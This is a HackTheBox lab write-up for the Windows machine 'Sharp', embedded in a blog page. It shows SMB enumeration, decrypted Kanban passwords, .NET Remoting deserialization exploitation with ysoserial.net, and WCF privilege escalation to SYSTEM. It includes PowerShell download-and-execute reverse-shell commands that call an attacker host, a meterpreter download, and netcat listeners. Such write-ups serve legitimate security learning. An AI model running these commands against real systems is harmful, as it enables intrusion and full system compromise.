@@ -1,0 +1,759 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.22.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HackTheBox - Sharp - #keepLearning</title>
+<meta name="description" content="An interesting Windows machine which punished my rusty Windows skills.">
+
+
+  <meta name="author" content="Philipp Menner">
+  
+  <meta property="article:author" content="Philipp Menner">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="#keepLearning">
+<meta property="og:title" content="HackTheBox - Sharp">
+<meta property="og:url" content="https://vpm.rocks/boxes/Sharp/">
+
+
+  <meta property="og:description" content="An interesting Windows machine which punished my rusty Windows skills.">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-05-01T12:33:36-04:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://vpm.rocks/boxes/Sharp/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Philipp Menner",
+      "url": "https://vpm.rocks/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/88x88.png" alt="#keepLearning"></a>
+        
+        <a class="site-title" href="/">
+          #keepLearning
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox - Sharp">
+    <meta itemprop="description" content="An interesting Windows machine which punished my rusty Windows skills.">
+    <meta itemprop="datePublished" content="2021-05-01T12:33:36-04:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HackTheBox - Sharp
+</h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-cog"></i> Table of Contents</h4></header>
+              <ul class="toc__menu"><li><a href="#recon">Recon</a><ul><li><a href="#reversing">Reversing</a></li><li><a href="#exploiting-remoting-service">Exploiting remoting service</a></li><li><a href="#getting-shell-and-user">Getting shell and user</a></li></ul></li><li><a href="#root">Root.</a></li><li><a href="#appendix">Appendix</a><ul><li><a href="#full-nmap-scan">Full nmap scan</a></li></ul></li><li><a href="#resources">Resources</a></li></ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="recon">Recon</h1>
+<p>The nmap scan shows an open smbport which we try to enum anonymously via</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>smbclient <span class="nt">-L</span> 10.10.10.219
+<span class="go">Enter WORKGROUP\kali's password:
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+</span><span class="gp">	ADMIN$</span><span class="w">          </span>Disk      Remote Admin
+<span class="gp">	C$</span><span class="w">              </span>Disk      Default share
+<span class="go">	dev             Disk
+</span><span class="gp">	IPC$</span><span class="w">            </span>IPC       Remote IPC
+<span class="go">	kanban          Disk
+	SMB1 disabled -- no workgroup available
+</span></code></pre></div></div>
+<p>just hitting enter as pw and notice <code class="language-plaintext highlighter-rouge">kanban</code> and <code class="language-plaintext highlighter-rouge">dev</code> but we are lacking info in regards of accessing these shares. Crackmapexec doesnt help here:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ crackmapexec smb 10.10.10.219 --shares -u '' -p ''
+SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+</code></pre></div></div>
+<p>Anothering thing we can do is trying to connect to each share manually and succeed:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>smbclient <span class="nt">-t</span> cifs <span class="s1">'//10.10.10.219/kanban/'</span> <span class="nb">.</span>
+<span class="go">Anonymous login successful
+Try "help" to get a list of possible commands.
+</span><span class="gp">smb: \&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>From the files inside this directory the most interesting is <code class="language-plaintext highlighter-rouge">PortableKanban.pk3</code>, which contains encrypted creds:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"k+iUoOvQYG98PuhhRC7/rg==","Role":"Admin","Inactive":false,"TimeStamp":637409769245503731}
+{"Id":"0628ae1de5234b81ae65c246dd2b4a21","Name":"lars","Initials":"","Email":"","EncryptedPassword":"Ua3LyPFM175GN8D3+tqwLA==","Role":"User","Inactive":false,"TimeStamp":637409769265925613}
+</span></code></pre></div></div>
+<p>Using <a href="https://www.exploit-db.com/exploits/49409">this tool</a> we get the following decrypted credentials from the file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python3 kanban.py ./PortableKanban.pk3
+<span class="gp">Administrator:G2@$</span>btRSHJYTarg
+<span class="go">lars:G123HHrth234gRG
+</span></code></pre></div></div>
+<p>We are now able to use lars’ creds to access the dev folder of the smb server and grab all files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>smbclient <span class="nt">-t</span> cifs <span class="s1">'//10.10.10.219/dev/'</span> <span class="nt">-U</span> <span class="s1">'lars'</span>
+<span class="go">Enter WORKGROUP\lars's password:
+Try "help" to get a list of possible commands.
+</span><span class="gp">smb: \&gt;</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">.                                   D        0  Sun Nov 15 06:30:13 2020
+..                                  D        0  Sun Nov 15 06:30:13 2020
+Client.exe                          A     5632  Sun Nov 15 05:25:01 2020
+notes.txt                           A       70  Sun Nov 15 08:59:02 2020
+RemotingLibrary.dll                 A     4096  Sun Nov 15 05:25:01 2020
+Server.exe                          A     6144  Mon Nov 16 06:55:44 2020
+
+		10357247 blocks of size 4096. 7922970 blocks available
+</span><span class="gp">smb: \&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>We take a look at <code class="language-plaintext highlighter-rouge">notes.txt</code> and the file types. .Net files are easy to reverse and that’s what we’ll do next:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>notes.txt
+<span class="go">Todo:
+    Migrate from .Net remoting to WCF
+    Add input validation
+</span><span class="gp">$</span><span class="w"> </span>file <span class="k">*</span>.dll <span class="k">*</span>.exe
+<span class="go">RemotingLibrary.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
+Client.exe:          PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+Server.exe:          PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+</span></code></pre></div></div>
+<p>Before diving into it we try to access the other smb shares using both creds - nothing useful.</p>
+
+<h2 id="reversing">Reversing</h2>
+<p>To reverse <code class="language-plaintext highlighter-rouge">.Net</code> files dnSpy proved useful. Clicking through all three files we soon find interesting informations:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>private static void Main(string[] args)
+{
+	ChannelServices.RegisterChannel(new TcpChannel(), true);
+	IDictionary channelSinkProperties = ChannelServices.GetChannelSinkProperties((Remoting)Activator.GetObject(typeof(Remoting), "tcp://localhost:8888/SecretSharpDebugApplicationEndpoint"));
+	channelSinkProperties["username"] = "debug";
+	channelSinkProperties["password"] = "SharpApplicationDebugUserPassword123!";
+}
+</code></pre></div></div>
+
+<h2 id="exploiting-remoting-service">Exploiting remoting service</h2>
+<p>Googling for .NET remoting service leads us to the tool <code class="language-plaintext highlighter-rouge">ExploitRemotingService</code> which was built exactly for <code class="language-plaintext highlighter-rouge">exploiting .NET Remoting Services vulnerable to CVE-2014-1806 or CVE-2014-4149</code>. As we can see the CVEs are pretty old however the tool allows us to specify our own base64 encoded payload via the <code class="language-plaintext highlighter-rouge">raw</code> command. We can build this payload using our beloved <code class="language-plaintext highlighter-rouge">ysoserial</code> tool and here specifically the <code class="language-plaintext highlighter-rouge">ysoserial.net</code> version.
+After that I spent a few hours getting windows set up to compile the ExploitRemotingService and another one or two to find the right <a href="https://labs.f-secure.com/advisories/milestone-xprotect-net-deserialization-vulnerability/">gadget</a>.</p>
+
+<p>To test this gadget, it always pays to start with the most simple commands to confirm RCE and then move on to something more advanced like a reverse shell. Often times and also in this case it’s pinging our host. To record the pings we set up wireshark and filter for ICMP packets:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># create payload
+&gt; .\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 10.10.14.6"
+[this results in a terribly long base64 encoded payload which Ill cut out but which we append to the following command.]
+&gt; .\ExploitRemotingService.exe -s --user='debug' --pass='SharpApplicationDebugUserPassword123!' tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw [payload from ysoserial]
+</code></pre></div></div>
+<p>Sample from wireshark:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>60	140.462518	10.10.10.219	10.10.14.6	ICMP	74	Echo (ping) request  id=0x0001, seq=5/1280, ttl=127 (reply in 61)
+61	140.462704	10.10.14.6	10.10.10.219	ICMP	74	Echo (ping) reply    id=0x0001, seq=5/1280, ttl=128 (request in 60)
+</code></pre></div></div>
+<p>So we confirmed the vulnerability and RCE. Onto shell.</p>
+<h2 id="getting-shell-and-user">Getting shell and user</h2>
+<p>A cool method without touching the local disk and spawning a reverse shell from memory is</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># payload to grab invoke-powershellTcp.ps1 from our http server and execute reverse shell</span>
+<span class="o">&gt;</span> .<span class="se">\y</span>soserial.exe <span class="nt">-o</span> <span class="nb">base64</span> <span class="nt">-g</span> TypeConfuseDelegate <span class="nt">-f</span> BinaryFormatter <span class="nt">-c</span> <span class="s2">"Powershell iex (iwr http://10.10.14.6:8000/invoke-powershelltcp.ps1 -usebasicparsing); invoke-powershelltcp -Reverse -IPAddress 10.10.14.6 -Port 1234"</span>
+<span class="o">[</span>snip]
+
+<span class="c"># Execute the payload</span>
+<span class="o">&gt;</span> .<span class="se">\E</span>xploitRemotingService.exe <span class="nt">-s</span> <span class="nt">--user</span><span class="o">=</span><span class="s1">'debug'</span> <span class="nt">--pass</span><span class="o">=</span><span class="s1">'SharpApplicationDebugUserPassword123!'</span> tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw <span class="o">[</span>snip]
+
+<span class="c"># retrieve payload</span>
+<span class="o">&gt;</span> .<span class="se">\n</span>c.exe <span class="nt">-lnvp</span> 1234
+listening on <span class="o">[</span>any] 1234 ...
+connect to <span class="o">[</span>10.10.14.6] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.219] 49697
+Windows PowerShell running as user lars on SHARP
+Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+sharp<span class="se">\l</span>ars
+</code></pre></div></div>
+<p>For this to work we only need to host the reverse shell file on a local http server and set up a netcat listener on port 1234.
+As an alternative, albeit messy way, I made a three step approach:</p>
+<ul>
+  <li>creating a writeable directory <code class="language-plaintext highlighter-rouge">mkdir C:\tmp</code></li>
+  <li>upload meterpreter shell <code class="language-plaintext highlighter-rouge">wget 10.10.14.6:8000/rev.exe -o C:\tmp\rev.exe</code></li>
+  <li>executing it <code class="language-plaintext highlighter-rouge">C:\tmp\rev.exe</code></li>
+</ul>
+
+<h1 id="root">Root.</h1>
+<p>After collecting the user flag on Lars’ desktop we find a wcf client in his <code class="language-plaintext highlighter-rouge">Documents</code> folder, which we copy onto our box via smb:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; Copy-Item C:\Users\lars\Documents\wcf -Destination C:\dev -Recurse
+
+$  smbclient //10.10.10.219/dev -U lars
+Enter WORKGROUP\lars's password:
+Try "help" to get a list of possible commands.
+smb: \&gt; recurse ON
+smb: \&gt; prompt OFF
+smb: \&gt; cd wcf
+smb: \wcf\&gt; mget *
+</code></pre></div></div>
+<p>Opening the project in Visual Studio 19 reveals</p>
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="nn">RemotingSample</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.ServiceModel</span><span class="p">;</span>
+
+<span class="k">namespace</span> <span class="nn">Client</span> <span class="p">{</span>
+
+	<span class="k">public</span> <span class="k">partial</span> <span class="k">class</span> <span class="nc">Client</span>
+	<span class="p">{</span>
+		<span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">()</span> <span class="p">{</span>
+			<span class="n">IWcfService</span> <span class="n">wcfService</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ChannelFactory</span><span class="p">&lt;</span><span class="n">IWcfService</span><span class="p">&gt;(</span><span class="k">new</span> <span class="nf">NetTcpBinding</span><span class="p">(</span><span class="n">SecurityMode</span><span class="p">.</span><span class="n">Transport</span><span class="p">),</span> <span class="s">"net.tcp://localhost:8889/wcf/NewSecretWcfEndpoint"</span><span class="p">).</span><span class="nf">CreateChannel</span><span class="p">();</span>
+			<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">wcfService</span><span class="p">.</span><span class="nf">GetDiskInfo</span><span class="p">());</span>
+			<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">wcfService</span><span class="p">.</span><span class="nf">GetCpuInfo</span><span class="p">());</span>
+			<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">wcfService</span><span class="p">.</span><span class="nf">GetRamInfo</span><span class="p">());</span>
+			<span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>We find out that this service is the one shown in the nmap scan on port 8889. Also, looking into <code class="language-plaintext highlighter-rouge">RemotingSample</code>, <code class="language-plaintext highlighter-rouge">InvokePowerShell</code> instantly gets our attention:</p>
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">namespace</span> <span class="nn">RemotingSample</span>
+<span class="p">{</span>
+	<span class="p">[</span><span class="n">ServiceContract</span><span class="p">]</span>
+	<span class="k">public</span> <span class="k">interface</span> <span class="nc">IWcfService</span>
+	<span class="p">{</span>
+		<span class="p">[</span><span class="n">OperationContract</span><span class="p">]</span>
+		<span class="kt">string</span> <span class="nf">GetUsers</span><span class="p">();</span>
+
+        <span class="p">[</span><span class="n">OperationContract</span><span class="p">]</span>
+		<span class="kt">string</span> <span class="nf">GetDiskInfo</span><span class="p">();</span>
+
+		<span class="p">[</span><span class="n">OperationContract</span><span class="p">]</span>
+		<span class="kt">string</span> <span class="nf">GetCpuInfo</span><span class="p">();</span>
+
+		<span class="p">[</span><span class="n">OperationContract</span><span class="p">]</span>
+		<span class="kt">string</span> <span class="nf">GetRamInfo</span><span class="p">();</span>
+
+		<span class="p">[</span><span class="n">OperationContract</span><span class="p">]</span>
+		<span class="kt">string</span> <span class="nf">InvokePowerShell</span><span class="p">(</span><span class="kt">string</span> <span class="n">scriptText</span><span class="p">);</span>														
+	<span class="p">}</span>
+	<span class="p">[</span><span class="n">snip</span><span class="p">]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Researching a bit we confirm that this <code class="language-plaintext highlighter-rouge">WCF</code> endpoint is vulnerable to privilege escalation, <a href="https://versprite.com/blog/security-research/abusing-insecure-wcf-endpoints/">quoting</a>:</p>
+<blockquote>
+  <p>Despite the fact that our client was launched from a low-privilege context, the process created by the endpoint operation is executed by NT AUTHORITY\SYSTEM. This trait is the pitfall of insecure WCF services.</p>
+</blockquote>
+
+<p>The first thing we might try, is simply replacing the Get..() function calls with the following line to the client, compile it and hope to get a shell back when running this file after copying to the remote box:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Console.WriteLine(wcfService.InvokePowerShell("iex (iwr http://10.10.14.6:8000/invoke-powershelltcp.ps1 -usebasicparsing); invoke-powershelltcp -Reverse -IPAddress 10.10.14.6 -Port 1234"));
+
+</code></pre></div></div>
+<p>And indeed:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\dev&gt;</span><span class="w"> </span>wget 10.10.14.2:8000/WcfRemotingLibrary.dll <span class="nt">-o</span> WcfRemotingLibrary.dll
+<span class="gp">PS C:\dev&gt;</span><span class="w"> </span>wget 10.10.14.2:8000/WcfClient.exe <span class="nt">-o</span> WcfClient.exe
+<span class="gp">PS C:\dev&gt;</span><span class="w"> </span>./WcfClient.exe
+<span class="go">
+</span><span class="gp">&gt;</span><span class="w"> </span>.<span class="se">\n</span>c64.exe <span class="nt">-lnvp</span> 1234
+<span class="go">listening on [any] 1234 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.219] 49678
+</span><span class="gp">Windows PowerShell running as user SHARP$</span><span class="w"> </span>on SHARP
+<span class="go">Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+</span><span class="gp">PS C:\Windows\system32&gt;</span><span class="nb">whoami</span>
+<span class="go">nt authority\system
+</span></code></pre></div></div>
+<h1 id="appendix">Appendix</h1>
+<h2 id="full-nmap-scan">Full nmap scan</h2>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> initial.nmap <span class="nt">-p-</span> 10.10.10.219
+<span class="go">PORT     STATE SERVICE            VERSION
+135/tcp  open  msrpc              Microsoft Windows RPC
+139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+5985/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8888/tcp open  storagecraft-image StorageCraft Image Manager
+8889/tcp open  mc-nmf             .NET Message Framing
+</span><span class="gp">Service Info: OS: Windows;</span><span class="w"> </span>CPE: cpe:/o:microsoft:windows
+<span class="go">
+Host script results:
+|_clock-skew: -1s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-02-21T16:23:09
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 211.12 seconds
+</span></code></pre></div></div>
+
+<h1 id="resources">Resources</h1>
+<p><br />
+[0] <a href="https://www.exploit-db.com/exploits/49409">Decrypt Kanban password</a>
+<br />
+[1] <a href="https://github.com/tyranid/ExploitRemotingService">A tool to send our malicious payload</a>
+<br />
+[2] <a href="https://github.com/NHPT/ysoserial.net">Ysoserial.net to create our malicious .net payload</a>
+<br />
+[3] <a href="https://labs.f-secure.com/advisories/milestone-xprotect-net-deserialization-vulnerability/">Interesting read to find the right gadget</a>
+<br />
+[4] <a href="https://versprite.com/blog/security-research/abusing-insecure-wcf-endpoints/">WCF Endpoint vulnerabilities</a></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#c-sharp" class="page__taxonomy-item" rel="tag">c sharp</a><span class="sep">, </span>
+    
+      <a href="/tags/#re" class="page__taxonomy-item" rel="tag">RE</a><span class="sep">, </span>
+    
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#boxes" class="page__taxonomy-item" rel="tag">boxes</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-05-01T12:33:36-04:00">May 1, 2021</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=HackTheBox+-+Sharp%20https%3A%2F%2Fvpm.rocks%2Fboxes%2FSharp%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fvpm.rocks%2Fboxes%2FSharp%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fvpm.rocks%2Fboxes%2FSharp%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/protected/factory/" class="pagination--pager" title="HackTheBox - Factory
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/protected/factory/" rel="permalink">HackTheBox - Factory
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Write-up of the hardware challenge Factory from Hack The Box
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/protected/theneedle/" rel="permalink">HackTheBox - The Needle
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Write-up of the hardware challenge The Needle from Hack The Box
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/protected/debugging_interface/" rel="permalink">HackTheBox - Debugging Interface
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Write-up of the challenge Debugging Interface from Hack The Box
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/protected/Schooled-active/" rel="permalink">Writeup: HackTheBox - Schooled
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          9 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Schooled is a FreeBSD box that I enjoyed greatly.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 Philipp Menner. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
